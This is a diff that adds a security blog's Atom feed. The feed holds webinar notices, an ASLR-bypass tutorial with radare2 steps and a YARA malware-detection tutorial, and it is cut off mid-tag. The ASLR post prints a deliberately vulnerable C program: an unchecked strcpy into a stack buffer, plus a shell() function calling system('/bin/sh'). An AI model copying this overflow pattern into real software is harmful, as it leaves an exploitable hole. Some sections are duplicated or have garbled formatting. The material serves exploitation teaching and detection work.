@@ -1,0 +1,548 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://real0day.github.io//feed.xml" rel="self" type="application/atom+xml"/><link href="https://real0day.github.io//" rel="alternate" type="text/html" hreflang="en"/><updated>2025-02-04T16:23:32+00:00</updated><id>https://real0day.github.io//feed.xml</id><title type="html">REal0day’s Blog</title><subtitle>I write about things </subtitle><entry><title type="html">Winning CTFs with Corellium</title><link href="https://real0day.github.io//blog/2025/first-corellium-talk/" rel="alternate" type="text/html" title="Winning CTFs with Corellium"/><published>2025-02-03T21:28:16+00:00</published><updated>2025-02-03T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2025/first-corellium-talk</id><content type="html" xml:base="https://real0day.github.io//blog/2025/first-corellium-talk/"><![CDATA[<p>My webinar with Corellium Winning CTFs with Corellium was a success! Super excited to share with you everything we spoke about.</p> <p>Virtual Event: Practical Capture the Flag (CTF) Insights to Gain a Competitive Edge</p> <p>Corellium is redefining how cybersecurity professionals, CTF enthusiasts, and educators tackle challenges. In this recent episode, Brian Robison, Corellium’s Chief Evangelist &amp; VP of Product Management, and Chris Magistrado, Founder &amp; Host at REal0day, shared exclusive insights on how Corellium’s advanced virtual environments and streamlined workflows simplify complex tasks and enhance success in cybersecurity competitions.</p> <p>Whether you’re aiming to gain a competitive edge, sharpen your skills, or enhance your teaching methods, this session provided practical strategies to elevate your approach and maximize performance.</p> <p>Key Takeaways Streamline your approach to CTF challenges with Corellium’s advanced workflows. Explore virtual environments that simplify the most complex tasks. Gain practical strategies for achieving a competitive edge in cybersecurity competitions. Date: Available On-Demand</p> <p>Change What’s Possible is our ongoing series of events designed for mobile security professionals. During each session, members of the Corellium team will discuss how virtual devices can advance mobile cybersecurity research and testing.</p> <p>Speakers Chief Evangelist &amp; VP Product Management, Brian Robison</p> <p>A seasoned cybersecurity executive with over 25 years of experience, serving as Chief Evangelist &amp; VP Product Management at Corellium–driving product innovation, strategy, and thought leadership. Previously, as VP of Solution Strategy and Chief Evangelist at BlackBerry, Brian led market differentiation and captivated global audiences with live Hacking Exposed events, showcasing real-world cyber threats. He has also held leadership roles at Cylance, Citrix XenMobile, Good Technology, McAfee, and Tripwire, contributing to advancements in endpoint security, mobile security, and enterprise strategy. A sought-after speaker, Brian has presented at major events like RSA, Black Hat, and ISC2, sharing his expertise in modern cybersecurity challenges.</p> <p>Guest Speaker: Founder &amp; CEO at TopCleared Recruiting, Chris Magistrado</p> <p>Chris Magistrado has more than a decade of experience in security research, focusing on vulnerability research, exploit development, malware analysis, and mobile security. His work spans Android and iOS internals, as well as machine learning applications in cybersecurity. Chris has shared his knowledge through talks at BSides conferences, contributing to the community with insights into complex technical challenges. He is the founder of TopCleared Recruiting, connecting skilled cybersecurity professionals with critical roles, and the host of the Hackers to Founders podcast, where he explores the journeys of researchers transitioning to entrepreneurship, sharing their challenges, strategies, and successes. Also a world traveler of 23 countries.</p> <p>You can learn more information here <a href="https://www.corellium.com/capture-the-flag-cyber-security">https://www.corellium.com/capture-the-flag-cyber-security</a>.</p>]]></content><author><name></name></author><category term="blog"/><category term="android"/><summary type="html"><![CDATA[Paid Webinar Engagement]]></summary></entry><entry><title type="html">Android Malware Dynamic Analysis with Corellium</title><link href="https://real0day.github.io//blog/2025/second-talk-with-corellium/" rel="alternate" type="text/html" title="Android Malware Dynamic Analysis with Corellium"/><published>2025-02-03T21:28:16+00:00</published><updated>2025-02-03T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2025/second-talk-with-corellium</id><content type="html" xml:base="https://real0day.github.io//blog/2025/second-talk-with-corellium/"><![CDATA[<p>Today, I’m excited to announce my second webinar with Corellium. I will be going over how to utilize their platform for malware analysis and research. The presentation will happen later this month!</p>]]></content><author><name></name></author><category term="blog"/><category term="android"/><summary type="html"><![CDATA[Paid Webinar Engagement]]></summary></entry><entry><title type="html">Hello Skid post</title><link href="https://real0day.github.io//blog/2024/first-post/" rel="alternate" type="text/html" title="Hello Skid post"/><published>2024-11-17T21:28:16+00:00</published><updated>2024-11-17T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2024/first-post</id><content type="html" xml:base="https://real0day.github.io//blog/2024/first-post/"><![CDATA[<p>Hello Skids.</p>]]></content><author><name></name></author><category term="blog"/><category term="test"/><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">Building a Centralized Resource: The Mobile CTF Lab for Reverse Engineers</title><link href="https://real0day.github.io//blog/2024/building-a-centralized-resource-the-mobile-ctf-lab-for-reverse-engineers/" rel="alternate" type="text/html" title="Building a Centralized Resource: The Mobile CTF Lab for Reverse Engineers"/><published>2024-10-11T11:59:13+00:00</published><updated>2024-10-11T11:59:13+00:00</updated><id>https://real0day.github.io//blog/2024/building-a-centralized-resource-the-mobile-ctf-lab-for-reverse-engineers</id><content type="html" xml:base="https://real0day.github.io//blog/2024/building-a-centralized-resource-the-mobile-ctf-lab-for-reverse-engineers/"><![CDATA[]]></content><author><name></name></author></entry><entry><title type="html">Android Security Enhancements, Version by Version</title><link href="https://real0day.github.io//blog/2024/android-security-enhancements-version-by-version/" rel="alternate" type="text/html" title="Android Security Enhancements, Version by Version"/><published>2024-10-06T13:47:50+00:00</published><updated>2024-10-06T13:47:50+00:00</updated><id>https://real0day.github.io//blog/2024/android-security-enhancements-version-by-version</id><content type="html" xml:base="https://real0day.github.io//blog/2024/android-security-enhancements-version-by-version/"><![CDATA[]]></content><author><name></name></author></entry><entry><title type="html">Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra</title><link href="https://real0day.github.io//blog/2024/google-gemini-updates-flash-15-gemma-2-and-project-astra/" rel="alternate" type="text/html" title="Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra"/><published>2024-05-14T00:00:00+00:00</published><updated>2024-05-14T00:00:00+00:00</updated><id>https://real0day.github.io//blog/2024/google-gemini-updates-flash-15-gemma-2-and-project-astra</id><content type="html" xml:base="https://real0day.github.io//blog/2024/google-gemini-updates-flash-15-gemma-2-and-project-astra/"><![CDATA[]]></content><author><name></name></author><summary type="html"><![CDATA[We’re sharing updates across our Gemini family of models and a glimpse of Project Astra, our vision for the future of AI assistants.]]></summary></entry><entry><title type="html">Bypassing ASLR Damn Heroes and their defenses</title><link href="https://real0day.github.io//blog/2023/bypassing-aslr/" rel="alternate" type="text/html" title="Bypassing ASLR Damn Heroes and their defenses"/><published>2023-03-23T21:28:16+00:00</published><updated>2023-03-23T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2023/bypassing-aslr</id><content type="html" xml:base="https://real0day.github.io//blog/2023/bypassing-aslr/"><![CDATA[<p><img src="/assets/img/shield_hero.png" alt="Shield Hero" title="Shield Hero" class="featured-image"/> Shield Hero Damn heroes and their defenses. —</p> <p>All of the tutorials we’ve done thus far have been done without randomizing memory locations. As we move towards younger code, we move towards code that has a few more security mechanisms in them. Not to worry, all mechanics can be broken, given enough time, and the time has come for us to break ASLR.</p> <h2 id="history">History</h2> <p><strong>Address space layout randomization (ASLR)</strong> was developed as a security mechanism to prevent the exploitation of functions in memory. It randomizes the address space positions of the stack, heap, and libraries.</p> <p><img src="/assets/img/aslr-osx.png" alt="ASLR" title="ASLR" class="featured-image"/></p> <ul> <li>Linux PaX project was the first to design, publish, and implement ASLR into the Linux kernel in July 2001.</li> <li>The first mainstream OS to support ASLR was OpenBSD 3.4 in 2003.</li> <li>Windows integrated ASLR into their OS starting with Vista in January 2007.</li> </ul> <p>Integrating ASLR into Vista added a 1 in 256 chance the correct address could be selected. They enabled it only for executables and dynamic link libraries specially linked to be ASLR-enabled. For compatibility, it was not enabled by default for other programs. ASLR can be turned on by default via editing the registry entry: <code class="language-plaintext highlighter-rouge">HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\MoveImages</code></p> <p>Alternatively, it can be enabled by installing the <strong>Enhanced Mitigation Experience Toolkit (EMET).</strong></p> <hr/> <h2 id="bypassing-aslr">Bypassing ASLR</h2> <p>When we played with Bypassing NX/DEP, we only had to determine the base address for the function <code class="language-plaintext highlighter-rouge">[system()]</code> in <code class="language-plaintext highlighter-rouge">libc</code>, and the location of the string, <code class="language-plaintext highlighter-rouge">"/bin/sh"</code>. When we turn on <code class="language-plaintext highlighter-rouge">randomize_va_space</code> (enabled by default in most Linux OS’), it will randomize the location of the <code class="language-plaintext highlighter-rouge">libc</code> base address.</p> <p><img src="/assets/img/aslr-ex1.png" alt="aslr-ex1" title="aslr-ex1" class="featured-image"/></p> <p><strong>Trick:</strong> Only the <code class="language-plaintext highlighter-rouge">libc</code> base address is randomized. The offset of each function from the base address is not random at all. If we can determine the base address for <code class="language-plaintext highlighter-rouge">libc</code>, we can determine any function address by providing the offset of the random <code class="language-plaintext highlighter-rouge">libc</code> address.</p> <h2 id="understanding-position-independent-code-pic">Understanding Position Independent Code (PIC)</h2> <p>Position Independent Code (PIC) enables the sharing of .text segments among multiple processes. The shared library’s .text segment points to a specific table in the <code class="language-plaintext highlighter-rouge">.data</code> segment instead of providing an absolute virtual address. This is a table that holds global function’s absolute virtual addresses and their global symbols.</p> <p>The dynamic linker, as part of its relocation, appends this table. While relocation happens, only the <code class="language-plaintext highlighter-rouge">.data</code> segment is modified. The .text segment stays untouched.</p> <p>There are two ways a dynamic linker can relocate global symbols:</p> <h3 id="procedure-linkage-table-plt">Procedure Linkage Table (PLT):</h3> <p>Used to call external procedures/functions whose address isn’t known at the time of linking. This is resolved by the dynamic linker at runtime.</p> <h3 id="global-offset-table-got">Global Offset Table (GOT):</h3> <p>Similarly used to resolve addresses. Both PLT and GOT, along with other relocation information, are explained in greater length in related</p> <p>There are two ways a dynamic linker can relocate global symbols:</p> <ol> <li> <p><strong>Procedure Linkage Table (PLT):</strong><br/> Used to call external procedures/functions whose address isn’t known at the time of linking. This is resolved by the dynamic linker at runtime.</p> </li> <li> <p><strong>Global Offset Table (GOT):</strong><br/> Similarly used to resolve addresses. Both PLT and GOT, along with other relocation information, are explained in greater length in this article.</p> </li> </ol> <h2 id="lets-get-coding">Let’s Get Coding!</h2> <p>This code is from sploitfun.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="cm">/*
+ * Even though shell() function isn't invoked directly, it's needed here since
+ * 'system@PLT' and 'exit@PLT' stub code should be present in the executable to
+ * successfully exploit it.
+ */</span>
+<span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>As I’m taking apart this binary after seeking to <code class="language-plaintext highlighter-rouge">main</code>, I realize I don’t see the function call for the function <code class="language-plaintext highlighter-rouge">shell()</code>. But that’s because <code class="language-plaintext highlighter-rouge">main</code> doesn’t call it. I’d like to learn how to find all the functions in a binary.</p> <p>At first, I ran the <code class="language-plaintext highlighter-rouge">afl</code> command but didn’t get any results. This is because <code class="language-plaintext highlighter-rouge">r2</code> needs to analyze the binary first. So use <code class="language-plaintext highlighter-rouge">aaa</code>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>aaa
+<span class="nv">$ </span>afl
+</code></pre></div></div> <p><img src="/assets/img/aslr-ex2.png" alt="aslr-ex2" title="aslr-ex2" class="featured-image"/></p> <p>All the functions that are native to the binary start with sym. So the function we created, yet never called in main, is named sym.shell, respectively. Again, remember I use the “s” for “seek.”</p> <p>Let’s analyze sym.shell now. To analyze <code class="language-plaintext highlighter-rouge">sym.shell</code>, you can use the following steps with Radare2:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> s sym.shell
+<span class="o">&gt;</span> pdf
+</code></pre></div></div> <p>The s command is used to <code class="language-plaintext highlighter-rouge">seek</code> to the address of the function, and pdf will print the disassembly of the function.</p> <p>Let’s analyze sym.shell now. <img src="/assets/img/aslr-ex3.png" alt="aslr-ex3" title="aslr-ex3" class="featured-image"/></p> <h2 id="references">References</h2> <ul> <li><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/">Bypassing ASLR Part I by sploitfun</a></li> <li><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">Wiki: Address Space Layout Randomization (ASLR)</a></li> <li><a href="https://reverseengineering.stackexchange.com/questions/1992/what-is-plt-got">What is PLT?</a></li> <li><a href="https://zachgrace.com/cheat_sheets/radare2.html">Radare2 Cheat Sheet by Zach Grace</a></li> <li><a href="https://chris-magistrado-c74h.squarespace.com/s/Jump-Over-ASLR-Attacking-Branch-Predictors-to-Bypass-ASLR.pdf">Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR</a></li> <li><a href="https://en.wikipedia.org/wiki/Position-independent_code">Wikipedia: Position Independent Code</a></li> <li><a href="https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w">Radare2 YouTube Channel</a></li> <li><a href="https://0x00sec.org/t/linux-internals-dynamic-linking-wizardry/1082">Linux Internals: Dynamic Linking Wizardry on 0x00sec</a></li> <li><a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488">Linux Internals: The Art of Symbol Resolution on 0x00sec</a></li> <li><a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">Reverse Engineering 101: PLT and GOT – The Key to Code Sharing and Dynamic Libraries</a></li> <li><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">System Overlord: GOT and PLT for Pwning</a></li> <li><a href="https://en.wikipedia.org/wiki/Process_Environment_Block">Wikipedia: Process Environment Block (PEB)</a></li> <li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx">Microsoft: PEB Structure</a></li> <li><a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block">Wikipedia: Win32 Thread Information Block (TIB)</a></li> <li><a href="https://wehntrust.codeplex.com/SourceControl/latest#documentation/README.txt">WehnTrust Documentation</a></li> <li><a href="https://security.stackexchange.com/questions/58528/how-can-i-check-if-a-mac-application-has-nx-or-aslr-enabled">Security Stack Exchange: Does Your Program Have NX/XD and/or ASLR Enabled?</a></li> </ul>]]></content><author><name></name></author><category term="blog"/><category term="memory"/><category term="hacking"/><category term="aslr"/><category term="reverse"/><summary type="html"><![CDATA[Tutorial on bypassing ASLR]]></summary></entry><entry><title type="html">Creating Yara Rules for Malware Detection</title><link href="https://real0day.github.io//blog/2018/creating-yara-rules/" rel="alternate" type="text/html" title="Creating Yara Rules for Malware Detection"/><published>2018-02-12T21:28:16+00:00</published><updated>2018-02-12T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2018/creating-yara-rules</id><content type="html" xml:base="https://real0day.github.io//blog/2018/creating-yara-rules/"><![CDATA[<p><img src="/assets/img/yara-girl.gif" alt="Yara Girl" title="Yara Girl" class="featured-image"/></p> <h1 id="introduction">Introduction</h1> <p>We all know it’s way more fun to hack shit than to patch shit. That said, not all employers will be satisfied with a hacker who can only compromise systems. Some companies want security researchers that are able to apply patches based on malware samples/breach data they have collected or have found in the wild.</p> <p><strong>Author Assigned Level</strong>: Newbie or Wannabe</p> <p><strong>Required Skills</strong>: There really aren’t too many skills required for this. The deeper you understand malware anlaysis and reverse engineering, the more capable you’ll be at finding unique ways to catch malware. But this won’t hinder you from writing amazing yara rules. Most of the rules I’ve seen are pretty basic. Most look like a python script that took 5 minutes to write. The skill and detail comes in the analysis. Not in the actual yara rule itself.</p> <ul> <li>GNU Linux</li> <li>Familiar with C syntax (not required, but useful)</li> <li>Regex (not required, but useful)</li> </ul> <p><strong>Disclaimer</strong>: I learned yara on the streets, not in the schools. I have about 30hrs expereince with yara. A weekend for me.</p> <h1 id="the-paper">The Paper</h1> <p>I’ll be going over the following:</p> <ol> <li><strong>Rule Identifiers</strong></li> <li><strong>Yara Keywords</strong></li> <li><strong>Strings</strong> <ul> <li>Hexadecimal</li> <li>Text Strings</li> <li>String Modifiers</li> <li>Regular Expressions</li> <li>Sets of Strings</li> <li>Anonymous Strings</li> </ul> </li> <li><strong>Conditions</strong> <ul> <li>Boolean</li> <li>Counting String Instances</li> <li>String Offsets or Virtual Addresses</li> <li>Match Length</li> <li>File Size</li> <li>Executable <code class="language-plaintext highlighter-rouge">entry_point</code></li> <li>Accessing Data at a Given Position</li> <li>Applying One Condition Across Many Strings</li> <li>Iterating Over String Occurrences</li> </ul> </li> <li><strong>Referencing Other Rules</strong></li> <li><strong>Yara Essentials</strong> <ul> <li>Global Rules</li> <li>Private Rules</li> <li>Rule Tags</li> <li>Metadata</li> <li>Using Modules</li> <li>Undefined Values</li> <li>External/Argument Values</li> <li>Including Files</li> </ul> </li> <li><strong>Private Rules</strong></li> <li><strong>Rule Tags</strong></li> <li><strong>Metadata</strong></li> <li><strong>Using Modules</strong></li> <li><strong>Undefined Values</strong></li> <li><strong>External/Argument Values</strong></li> <li><strong>Including Files</strong></li> </ol> <p>Let’s get started. I want to do something else tonight besides just doc.</p> <h2 id="writing-yara-rules">Writing Yara Rules</h2> <p>Yara mostly resembles the syntax of the C language. Here is a simple rule that does nothing:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rule</span> <span class="n">HelloRule</span> <span class="p">{</span>
+    <span class="nl">condition:</span>
+        <span class="nb">false</span>
+<span class="p">}</span>
+</code></pre></div></div> <hr/> <h2 id="rule-identifiers">Rule Identifiers</h2> <p>The word the follows rule, in this case “dummy”, is known as the rule identifier. They can be:</p> <ul> <li>alphanumeric characters</li> <li>underscore character</li> <li>first char can’t be a digit</li> <li>case-sensitive</li> <li>cannot exceed 128 characters</li> </ul> <h2 id="yara-keywords">Yara Keywords</h2> <p>The following can’t be used as a rule identifier because they’re special to the yara language.</p> <ul> <li>all</li> <li>and</li> <li>any</li> <li>ascii</li> <li>at</li> <li>condition</li> <li>contains</li> <li>entrypoint</li> <li>false</li> <li>filesize</li> <li>fullword</li> <li>for</li> <li>global</li> <li>in</li> <li>import</li> <li>include</li> <li>int8</li> <li>int16</li> <li>int32</li> <li>int8be</li> <li>int16be</li> <li>int32be</li> <li>matches</li> <li>meta</li> <li>nocase</li> <li>not</li> <li>or</li> <li>of</li> <li>private</li> <li>rule</li> <li>strings</li> <li>them</li> <li>true</li> <li>uint8</li> <li>uint16</li> <li>uint32</li> <li>uint8be</li> <li>uint16be</li> <li>uint32be</li> <li>wide</li> </ul> <p>Generally, yara has two sections: **strings definition **and condition.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule HelloRule2    // This is an example
+<span class="o">{</span>
+    strings:
+        <span class="nv">$my_text_string</span> <span class="o">=</span> <span class="s2">"text here"</span>
+        <span class="nv">$my_hex_string</span> <span class="o">=</span> <span class="o">{</span> E2 34 A1 C8 23 FB <span class="o">}</span>
+
+    condition:
+        <span class="nv">$my_text_string</span> or <span class="nv">$my_hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This rule will be active when either string is found. As you can see, you can also add comments.</p> <h2 id="hexadecimal-strings">Hexadecimal Strings</h2> <h3 id="wildcards">Wildcards</h3> <p>Acceptable uses for hex-strings are wildcards, which are represented with a <code class="language-plaintext highlighter-rouge">?</code> mark.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule GambitWildcard
+<span class="o">{</span>
+    strings:
+       <span class="nv">$hex_string</span> <span class="o">=</span> <span class="o">{</span> EF 44 ?? D8 A? FB <span class="o">}</span>
+
+    condition:
+       <span class="nv">$hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EF 44 01 D8 AA FB
+EF 44 AA D8 AB FB
+</code></pre></div></div> <h3 id="unknown-length-of-wildcard">Unknown Length of Wildcard</h3> <p>Strings with an unknown length can be represented as the following:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule MarioJump
+<span class="o">{</span>
+        strings:
+           <span class="nv">$hex_string</span> <span class="o">=</span> <span class="o">{</span> F4 23 <span class="o">[</span>4-6] 62 B4 <span class="o">}</span>
+
+        condition:
+           <span class="nv">$hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>F4 23 01 02 03 04 62 B4
+F4 23 AA BB CC DD EE FF 62 B4
+</code></pre></div></div> <p><strong>Infinite</strong> is also possible.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule BuzzLightyear
+<span class="o">{</span>
+        strings:
+           <span class="nv">$hex_string</span> <span class="o">=</span> <span class="o">{</span> F4 23 <span class="o">[</span>-] 62 B4 <span class="o">}</span>
+
+        condition:
+           <span class="nv">$hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>F4 23 AA FF 62 B4
+F4 23 AA AA AA AA AA...FF FF 62 B4
+</code></pre></div></div> <h2 id="conditional-strings">Conditional Strings</h2> <p>You can create 1 to as many statements as you like.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule WorriedRabbit
+<span class="o">{</span>
+    strings:
+       <span class="nv">$hex_string</span> <span class="o">=</span> <span class="o">{</span> BA 21 <span class="o">(</span> DA BC | C6 <span class="o">)</span> A5 <span class="o">}</span>
+
+    condition:
+       <span class="nv">$hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BA 21 DA BC A5
+BA 21 C6 A5
+</code></pre></div></div> <h3 id="mixing-it-all-up">Mixing it all up</h3> <p>You can also combine them all, of course.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule WorriedGabmitLightyearJump
+<span class="o">{</span>
+    strings:
+       <span class="nv">$hex_string</span> <span class="o">=</span> <span class="o">{</span> BA ?? <span class="o">(</span> DA <span class="o">[</span>2-4] | C6 <span class="o">)</span> A5 <span class="o">}</span>
+
+    condition:
+       <span class="nv">$hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BA 01 DA 01 02 03 04 A5
+BA AA C6 A5
+BA FF DA 01 02 A5
+</code></pre></div></div> <h2 id="text-strings">Text Strings</h2> <p>An alternative to hex-strings, one can also use text strings.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule KimPossible
+<span class="o">{</span>
+    strings:
+        <span class="nv">$alert_string</span> <span class="o">=</span> <span class="s2">"Whats the Sitch"</span>
+
+    condition:
+       <span class="nv">$alert_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>One can also use the following escape sequences, just like in C:</p> <ul> <li><code class="language-plaintext highlighter-rouge">*\</code> **Double Quotes</li> <li><code class="language-plaintext highlighter-rouge">**</code> Backslash</li> <li><code class="language-plaintext highlighter-rouge">\t</code> Horizontal Tab</li> <li><code class="language-plaintext highlighter-rouge">\n</code> New line</li> <li><code class="language-plaintext highlighter-rouge">\xdd</code> Any byte in hexadecimal notation</li> </ul> <h2 id="modifiers">Modifiers</h2> <h3 id="case-insensitive-strings">Case-insensitive strings</h3> <p>By default, Yara is case-sensitive, but you can turn that off.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ThickSkin
+<span class="o">{</span>
+    strings:
+        <span class="nv">$strong_string</span> <span class="o">=</span> <span class="s2">"Iron"</span> nocase
+
+    condition:
+        <span class="nv">$strong_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <h3 id="wide-character-strings">Wide-character strings</h3> <p>The wide modifer can be used to search for strings encoded with two bytes per character, something typically in many executable binaries. If the string “FatTony” appears encoded as two bytes per character, it will be caught if we use the modifer wide. Let’s also add the nocase modifier as “FatTony” might be “fattony” and we wouldn’t want to miss that.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule FatTony
+<span class="o">{</span>
+    strings:
+        <span class="nv">$fat_villain</span> <span class="o">=</span> <span class="s2">"FatTony"</span> wide nocase
+
+    condition:
+        <span class="nv">$fat_villain</span>
+<span class="o">}</span>
+</code></pre></div></div> <p><strong>[!] Important [!]</strong> - Keep in mind that this modifier interleaves the <code class="language-plaintext highlighter-rouge">ASCII</code> codes of the characters in the string with zeroes, it does not support truly UTF-16 strings containing non-English characters. To add a search for strings in both <code class="language-plaintext highlighter-rouge">ASCII</code> and <code class="language-plaintext highlighter-rouge">wide</code>, use the following:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ASCIIFatTony
+<span class="o">{</span>
+    strings:
+        <span class="nv">$fat_villain</span> <span class="o">=</span> <span class="s2">"FatTony"</span> wide ascii nocase
+
+    condition:
+        <span class="nv">$fat_villain</span>
+<span class="o">}</span>
+</code></pre></div></div> <p><strong>ASCII is assumed by default</strong> so you don’t have to add ascii if you want to search for FatTony by ascii alone.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ASCIIFatTony
+<span class="o">{</span>
+    strings:
+        <span class="nv">$fat_villain</span> <span class="o">=</span> <span class="s2">"FatTony"</span>
+
+    condition:
+        <span class="nv">$fat_villain</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This works if you want to search without the wide and nocase modifiers.</p> <h3 id="fullwords-modifier">Fullwords Modifier</h3> <p>This modifier will catch on words that DO NOT have prepend and append the word with a character.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ShadyDomain
+<span class="o">{</span>
+    strings:
+        <span class="nv">$shady_domain</span> <span class="o">=</span> <span class="s2">"faceebook"</span> fullword
+
+    condition:
+       <span class="nv">$shady_domain</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www.faceebook.com
+www.myportal.faceebook.com
+https://secure.faceebook.com
+</code></pre></div></div> <p>This will <strong>NOT CATCH</strong> any of the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www.myfaceebook.com
+thefaceebook.com
+</code></pre></div></div> <p>The difference is that that the fullword is prepended or appended by a <em>special character</em>, not a regular character.</p> <h2 id="regular-expression">Regular Expression</h2> <p>Enclosed in forward slashes instead of double quotes, (like Perl Programming), yara allows for RegEx.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule RegularShow
+<span class="o">{</span>
+    strings:
+        <span class="nv">$re1</span> <span class="o">=</span> /md5: <span class="o">[</span>0-9a-fA-F]<span class="o">{</span>32<span class="o">}</span>/
+        <span class="nv">$re2</span> <span class="o">=</span> /state: <span class="o">(</span>on|off<span class="o">)</span>/
+
+    condition:
+        <span class="nv">$re1</span> and <span class="nv">$re2</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch any md5 string it finds, in either state.</p> <p>One can also apply text modifiers such as nocase,** ascii<strong>,</strong> wide<strong>,</strong> **and **fullword **to RegEx as well.</p> <h2 id="metacharacters">Metacharacters</h2> <p>A metacharacter is a character that has a special meaning (instead of a literal meaning) to a computer program. For RegEx, these are the following meanings</p> <ul> <li><code class="language-plaintext highlighter-rouge">**</code>: Quote the next metacharacter</li> <li><code class="language-plaintext highlighter-rouge">^</code>: Match the beginning of the file</li> <li><code class="language-plaintext highlighter-rouge">$</code>: Match the end of the file</li> <li><code class="language-plaintext highlighter-rouge">|</code>: Alternation</li> <li><code class="language-plaintext highlighter-rouge">()</code>: Grouping</li> <li><code class="language-plaintext highlighter-rouge">[]</code>: Bracketed character class</li> </ul> <p>The following quantifiers are also recognized:</p> <ul> <li><code class="language-plaintext highlighter-rouge">*</code>: Match 0 or more times</li> <li><code class="language-plaintext highlighter-rouge">+</code>: Match 1 or more times</li> <li><code class="language-plaintext highlighter-rouge">?</code>: Match 0 or 1 times</li> <li><code class="language-plaintext highlighter-rouge">{n}</code>: Match exactly n-times</li> <li><code class="language-plaintext highlighter-rouge">{n, }</code>: Match at least n-times</li> <li><code class="language-plaintext highlighter-rouge">{ ,m}</code>: Match at most m-times</li> <li><code class="language-plaintext highlighter-rouge">{n,m}</code>: Match n to m-times</li> </ul> <p>The following escape sequences are recognized:</p> <ul> <li><code class="language-plaintext 